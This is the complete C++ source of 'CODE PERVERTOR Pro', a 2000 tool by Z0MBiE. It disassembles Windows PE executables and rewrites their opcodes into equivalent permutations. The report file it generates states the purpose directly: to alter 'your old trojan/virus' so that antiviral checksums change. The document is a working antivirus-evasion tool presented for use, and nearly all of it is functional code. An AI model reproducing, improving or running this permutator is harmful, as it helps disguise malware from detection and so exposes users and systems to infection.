
// CODE PERVERTOR Pro
// http://z0mbie.cjb.net

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <assert.h>
#include <mem.h>

#pragma hdrstop

#include "mz.hpp"
#include "pe.hpp"

#include "lde32.cpp"
#include "random.cpp"

int OPT_MARKENTRY=1;
int OPT_MARKEXPORT=1;
int OPT_MARKCODE=1;
int OPT_DUMP=0;
int OPT_RND=1;
int OPT_SAVEMAP=0;

DWORD cnt;
char  *arr1[1024];
char  *arr2[1024];

void load_data(const char* filename)
{
  cnt=0;
  char a1[256],a2[256];
  a1[0]=a2[0]=0;

  printf("þ loading %s...\n", filename);
  FILE*f=fopen(filename,"rb");
  if (f==NULL)
  {
    printf("***ERROR***: error loading data file\n", filename);
    exit(0);
  }
  int m1=0, m2=0, line=0;
  while (!feof(f))
  {
    char c=fgetc(f);
    if (c==';') m1=1;
    if ((c==0x0D)||(c==0x0A)) { m1=0; line++; };
    if (!m1)
    {
      if (c=='-') m2=1;
      if (c=='+') m2=2;
      if (((c>='0')&&(c<='9'))||
          ((c>='a')&&(c<='z'))||
          ((c>='A')&&(c<='Z')))
      {
        if (m2==1) *(WORD*)&a1[strlen(a1)]=c;
        if (m2==2) *(WORD*)&a2[strlen(a2)]=c;
      }
      if (c=='$')
      {
        m2=0;
        arr1[cnt]=strdup(a1);
        arr2[cnt]=strdup(a2);
        cnt++;

        if ( (strlen(a1)!=strlen(a2)) || ((strlen(a1)&7)!=0) )
        {
          printf("***ERROR***: %s(%i): error\n",filename,line);
          exit(0);
        }

        a1[0]=0;
        a2[0]=0;
      }
    } // if (!m1)
  }
  fclose(f);

  if (cnt==0)
  {
    printf("***ERROR***: no data\n");
    exit(0);
  }

  printf("  %i bitmask(s) loaded\n",cnt);

//for (DWORD i=0; i<cnt; i++)
//  printf("- %s --> %s\n", arr1[i], arr2[i]);

}

#define C_XREF          0x01            // xref
#define C_CODE          0x02            // code
#define C_CODE0         0x04            // first opcode byte
#define C_ERROR         0x08            // cant disassemble
#define C_PROCESSED     0x10            // alredy processed

int pervert_opcode(BYTE* x)
{
  if (OPT_RND)
  if (rnd(2)) return 0;

  int var[26];

  for (DWORD i=0; i<cnt; i++)
  {

    memset(var, 0xFF, sizeof(var));
    for (DWORD j=0; j<strlen(arr1[i]); j++)
    {
      int  b = ( x[j>>3] >> (7-(j&7)) ) & 1;
      char c = arr1[i][j] | 0x20;  // lowercase
      if (c=='0') { if (b!=0) goto c1; } else
      if (c=='1') { if (b!=1) goto c1; } else
      if (var[c-'a']!=b)
      {
        if (var[c-'a']==-1)
          var[c-'a']=b;
        else
          goto c1;
      }
    }

    for (DWORD j=0; j<strlen(arr2[i]); j++)
    {
      char c = arr2[i][j] | 0x20;
      int b;
      if (c=='0') b=0; else
      if (c=='1') b=1; else
      {
        b=var[c-'a'];
        if (b==-1)
        {
          printf("***ERROR***: error in data file ('%c' variable)\n", c);
          exit(0);
        }
        if (c!=arr2[i][j]) b=b^1;  // upcase? - invert
      }
      if ((j&7)==0) x[j>>3]=0;
      x[j>>3] |= b << (7-(j&7));
    }

    return 1+i;

c1:
  }

  return 0;
}

DWORD rva2ofs(PE_HEADER* pe, PE_OBJENTRY (*oe)[], DWORD o)
{
  if (o < pe->pe_headersize) return o;
  for (int i=0; i<pe->pe_numofobjects; i++)
    if ( o - (*oe)[i].oe_virtrva < (*oe)[i].oe_physsize )
      return o - (*oe)[i].oe_virtrva + (*oe)[i].oe_physoffs;
  return 0;
}

DWORD ofs2rva(PE_HEADER* pe, PE_OBJENTRY (*oe)[], DWORD o)
{
  if (o < pe->pe_headersize) return o;
  for (int i=0; i<pe->pe_numofobjects; i++)
    if ( o - (*oe)[i].oe_physoffs < (*oe)[i].oe_physsize )
      return o - (*oe)[i].oe_physoffs + (*oe)[i].oe_virtrva;
  return 0;
}

int pervert_file(const char* ifile,
                 const char* ofile,
                 const char* xfile)
{

  FILE*f=fopen(ifile, "rb");
  if (f==NULL)
  {
    printf("***ERROR***: cant open file %s\n", ifile);
    return 0;
  }
  DWORD bufsize = filelength(fileno(f));
  printf("þ reading %i bytes from %s\n", bufsize, ifile);
  BYTE* buf = (BYTE*)malloc(bufsize);
  BYTE* buf0 = (BYTE*)malloc(bufsize);
  assert(buf);
  fread(buf, 1,bufsize, f);
  memcpy(buf0, buf, bufsize);
  fclose(f);

  MZ_HEADER *mz;
  PE_HEADER *pe;
  PE_OBJENTRY (*oe)[];

#define RVA2VA(o)    ((o)+pe->pe_imagebase)
#define RVA2OFS(o)   rva2ofs(pe,oe,o)
#define OFS2RVA(o)   ofs2rva(pe,oe,o)

  (BYTE*)mz = &buf[0];

  if (mz->mz_id!='MZ')
  {
    printf("***ERROR***: bad MZ header\n");
    return 0;
  }

  if ( (mz->mz_neptr+0x18>=bufsize)||
       ((pe=(PE_HEADER*)&buf[mz->mz_neptr])->pe_id!='PE\x00\x00')||
       (mz->mz_neptr+0x18+pe->pe_headersize>=bufsize)
     )
  {
    printf("***ERROR***: bad PE header\n");
    return 0;
  }
  printf("- PE header found at .%08X(%08X)\n", RVA2VA(mz->mz_neptr),RVA2OFS(mz->mz_neptr));

  (BYTE*)oe = &buf[ mz->mz_neptr+0x18+pe->pe_ntheadersize ];

  if (pe->pe_entrypointrva==0)
    printf("***WARNING***: no entry point\n");

  BYTE* map=(BYTE*)malloc(bufsize);
  assert(map);
  memset(map, 0, bufsize);

  if (OPT_MARKENTRY)
  if (pe->pe_entrypointrva)
  {
    printf("- marking entrypoint at .%08X(%08X)\n", RVA2VA(pe->pe_entrypointrva),RVA2OFS(pe->pe_entrypointrva));
    map[RVA2OFS(pe->pe_entrypointrva)] |= C_XREF;
  }

  if (OPT_MARKEXPORT)
  if (pe->pe_exportrva)
  {
    printf("- export table at .%08X(%08X)\n", RVA2VA(pe->pe_exportrva), RVA2OFS(pe->pe_exportrva));

    PE_EXPORT *ex = (PE_EXPORT*)&buf[ RVA2OFS(pe->pe_exportrva) ];
    DWORD *a = (DWORD*)&buf[ RVA2OFS( ex->ex_addresstablerva ) ];
    printf("- address table at .%08X(%08X), %i function(s)\n", RVA2VA(ex->ex_addresstablerva), RVA2OFS(ex->ex_addresstablerva), ex->ex_numoffunctions);
    if (RVA2OFS(ex->ex_addresstablerva))    //
    for (DWORD i=0; i<ex->ex_numoffunctions; i++)
    {
      DWORD xo = RVA2OFS(a[i]);
      if (xo)
      {
        if (OPT_DUMP)
        printf("- marking XREF at .%08X(%08X)\n", RVA2VA(a[i]), xo);
        if (buf[xo]==0x00)
        {
          if (OPT_DUMP)
          printf("- skipped ('coz first byte is 0x00)\n");
        }
        else
          map[xo] |= C_XREF;
      }
    }
  }

  if (OPT_MARKCODE)
  {
    printf("- searching for code sequences\n");
    for (DWORD i=0; i<bufsize; i++)
    {
      int j=0;
      if (buf[i]==0x55 && buf[i+1]==0x8B && buf[i+2]==0xEC) j++;
      if (buf[i]==0x64 && buf[i+1]==0x89 && buf[i+2]==0x25 && (*(DWORD*)&buf[i+3]==0) ) j++;
      if (buf[i]==0xE8 &&
          ( buf[i+5]==0x85 || (buf[i+5]&0xFD)==0x09 ) &&
          buf[i+6]==0xC0 &&
          ((buf[i+7]&0xF0)==0x70) ) j++;
      if (j)
      {
        if (OPT_DUMP)
        printf("- marking XREF at .%08X(%08X)\n", RVA2VA(OFS2RVA(i)),i);
        map[i] |= C_XREF;
      }
    }
  }

  printf("þ disassembling...\n");

  for (;;)
  {

    if (OPT_DUMP)
    printf("- searching for XREF marks\n");

    DWORD ipo=(DWORD)memchr(map,C_XREF,bufsize);
    if (!ipo)
    {
      if (OPT_DUMP)
      printf("not found, exiting\n");
      break;
    }
    ipo-=(DWORD)map;
    DWORD ip=OFS2RVA(ipo);
    if (!ip)
    {
      if (OPT_DUMP)
      printf("ofs2rva: cant find rva by offset (offset=%08X), exiting\n", ipo);
      break;
    }
    if (OPT_DUMP)
    printf("- XREF found at .%08X(%08X)\n", RVA2VA(ip),RVA2OFS(ip));

    map[ipo] |= C_PROCESSED;

    for (;;)
    {

      DWORD ipo=RVA2OFS(ip);
      if (!ipo)
      {
        if (OPT_DUMP)
        printf("rva2ofs: cant find offset by rva (rva=%08X), exiting\n",ip);
        break;
      }

      DWORD len=disasm(&buf[ ipo ]);
      if ((int)len==-1)
      {
        map[ipo] |= C_ERROR;
        if (OPT_DUMP)
        printf("cant disassemble, exiting\n");
        break;
      }

      if (*(WORD*)&buf[ipo]==0x0000)
      {
        map[ipo] |= C_ERROR;
        if (OPT_DUMP)
        printf("out of code (00 00 found), exiting\n");
        break;
      }

      if (map[ipo]&C_CODE)
      {
        if (OPT_DUMP)
        printf("- alredy CODE, exiting\n");
        break;
      }

      if (OPT_DUMP)
      {
        printf(".%08X(%08X) ", RVA2VA(ip),RVA2OFS(ip));
        for (DWORD i=0; i<len; i++)
          printf(" %02X",buf[ipo+i]);
        printf("\n");
      }

      map[ipo]|=C_CODE0;
      for (DWORD i=0; i<len; i++) map[ipo+i]|=C_CODE|C_PROCESSED;

      DWORD nxt=ip+len;
      DWORD rel=0;

      BYTE b=buf[ipo];
      WORD w=*(WORD*)&buf[ipo];
      DWORD o1 = ip + len + *(char*)&buf[ipo+len-1];
      DWORD o4 = ip + len + *(long*)&buf[ipo+len-4];

      if (b==0xE9) nxt = o4;
      if (b==0xE8) rel = o4;
      if ((w&0xF0FF)==0x800F) rel = o4;
      if (b==0xEB) nxt = o1;
      if ((b&0xF0)==0x70) rel = o1;
      if ((b&0xFC)==0xE0) rel = o1;
      if ((b&0xF6)==0xC2) nxt=0;
      if (b==0xCF) nxt=0;
      if ((w&0x38FF)==0x20FF) nxt=0;

      if (rel)
      {
        DWORD relo=RVA2OFS(rel);
        if (OPT_DUMP)
        printf("marking XREF at .%08X(%08X)\n",RVA2VA(rel),relo);
        if (!relo)
        {
          if (OPT_DUMP)
          printf("cant find offset by rva\n");
        }
        else
        {
          map[relo]|=C_XREF;
          if (map[relo]&C_CODE)
          {
            if (OPT_DUMP)
            printf("alredy code\n");
          }
        }
      }

      ip=nxt;
      if (!ip)
      {
        if (OPT_DUMP)
        printf("RET-alike opcode, exiting\n");
        break;
      }

    }
  }

  printf("þ perverting...\n");

  int count1=0, count2=0;

  for (DWORD i=0; i<bufsize; i++)
    if (map[i]&C_CODE0)
    {
      int len=disasm(&buf[i]);
      if (pervert_opcode(&buf[i]))
      {
        count1++;
        count2+=len;
      }
    }

  printf("  %i opcodes, %i bytes\n", count1, count2);

  if (xfile[0]!=0)
  {
    printf("þ writing xck-file %s\n", xfile);
    f=fopen(xfile, "wb");
    if (f==NULL)
    {
      printf("***ERROR***: cant create file\n");
      return 0;
    }
    fprintf(f,"[BeginXCK]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\x0D\x0A");
    fprintf(f,"þ Description   : your old trojan/virus\x0D\x0A");
    fprintf(f,"þ Crack subject : change antiviral checksums\x0D\x0A");
    fprintf(f,"þ Comments      : http://z0mbie.cjb.net\x0D\x0A");
    fprintf(f,"þ OS            : Win9X/NT\x0D\x0A");
    fprintf(f,"þ Type of hack  : code pemutation\x0D\x0A");
    fprintf(f,"þ Source lang   : Borland C++\x0D\x0A");
    fprintf(f,"þ Protection    : [þùùùùùùùùù] 01%\x0D\x0A");
    fprintf(f,"þ Size          : %i\x0D\x0A", bufsize);
    fprintf(f,"þ Crack made at : home ;-)\x0D\x0A");
    fprintf(f,"þ Time for hack : 00:00:00\x0D\x0A");
    fprintf(f,"þ Under Music   : Scorpions\x0D\x0A");
    fprintf(f,"[BeginCRK]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\x0D\x0A");
    fprintf(f,"Description\x0D\x0A");
    fprintf(f,"\x0D\x0A");
    fprintf(f,"Change some bytes...\x0D\x0A");
    fprintf(f,"%s\x0D\x0A",ifile);
    for (DWORD i=0; i<bufsize; i++)
      if (buf0[i]!=buf[i])
        fprintf(f,"%08X: %02X %02X\x0D\x0A", i, buf0[i], buf[i]);
    fprintf(f,"[EndCRK]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ\x0D\x0A");
    fprintf(f,"[EndXCK]\x0D\x0A");

    fclose(f);
  }

  if (OPT_SAVEMAP)
  {
    printf("þ writing map files\n");
    f=fopen("_map1", "wb");
    assert(f);
    for (DWORD i=0; i<bufsize; i++)
      buf0[i] = map[i] & C_CODE ? 0xCC : buf[i];
    fwrite(buf0, 1,bufsize, f);
    fclose(f);
    f=fopen("_map2", "wb");
    assert(f);
    for (DWORD i=0; i<bufsize; i++)
      buf0[i] = map[i] & C_CODE ? buf[i] : 0;
    fwrite(buf0, 1,bufsize, f);
    fclose(f);
 }

  f=fopen(ofile, "wb");
  if (f==NULL)
  {
    printf("***ERROR***: cant create file %s\n", ofile);
    return 0;
  }
  printf("þ writing %i bytes into %s\n", bufsize, ofile);
  fwrite(buf, 1,bufsize, f);
  fclose(f);

  return 1;
}

void help()
{
  printf("\n");
  printf("syntax:\n");
  printf("  PERVERT [option(s)] infile [outfile] [#xck-file] [@data-file]\n");
  printf("\n");
  printf("options:\n");
  printf("  -a          all possible commands (otherwise randomly)\n");
  printf("  -m1         do not mark entrypoint\n");
  printf("  -m2         do not mark export functions } use to avoid errors \n");
  printf("  -m3         do not mark code sequences   } if packed files\n");
  printf("  -d          debug dump\n");
  printf("  -x          save disassembly map files\n");
  printf("\n");
  printf("files:\n");
  printf("  infile      source file, PE EXE or PE DLL\n");
  printf("  outfile     destination file (overwrite infile if missed)\n");
  printf("  xck-file    difference file in .XCK format\n");
  printf("  data-file   default is PERVERT2.DAT\n");
  exit(0);
}

void badparam()
{
  printf("***ERROR***: error in command line parameters\n");
  exit(0);
}

void main(int argc, char* argv[])
{
  printf("CODE PERVERTOR Pro  v.2.00  (x) 2000 Z0MBiE  http://z0mbie.cjb.net\n");

  disasm_init();
  randseed = GetTickCount();

  char ifile[1024]="", ofile[1024]="", xfile[1024]="", dfile[1024];

  strcpy(dfile,argv[0]);
  strcpy(strrchr(dfile,'\\')+1,"PERVERT2.DAT");

  for (int i=1; i<argc; i++)
  {
    switch(argv[i][0])
    {
      case '-':
      case '/':
        switch ( argv[i][1]|0x20 ) {
          case '?':
          case 'h': help(); break;
          case 'a': OPT_RND=0; break;
          case 'x': OPT_SAVEMAP=1; break;
          case 'm': switch ( argv[i][2] ) {
                      case '1': OPT_MARKENTRY=0;  break;
                      case '2': OPT_MARKEXPORT=0; break;
                      case '3': OPT_MARKCODE=0;   break;
                      default: badparam();
                    };
                    break;
          case 'd': OPT_DUMP=1; break;
          default: badparam();
        }
        break;
      case '#': strcpy(xfile, &argv[i][1]); break;
      case '@': strcpy(dfile, &argv[i][1]); break;
      default:
        if (ifile[0]==0) strcpy(ifile,argv[i]); else
        if (ofile[0]==0) strcpy(ofile,argv[i]); else
          badparam();
    } // switch
  } // for
  if (ifile[0]==0) help();
  if (ofile[0]==0) strcpy(ofile, ifile);

  load_data(dfile);

  switch (pervert_file(ifile, ofile, xfile)) {
    case 0: printf("þ an error occured while perverting file\n"); break;
    case 1: printf("þ file has been successfully perverted\n"); break;
  }
}
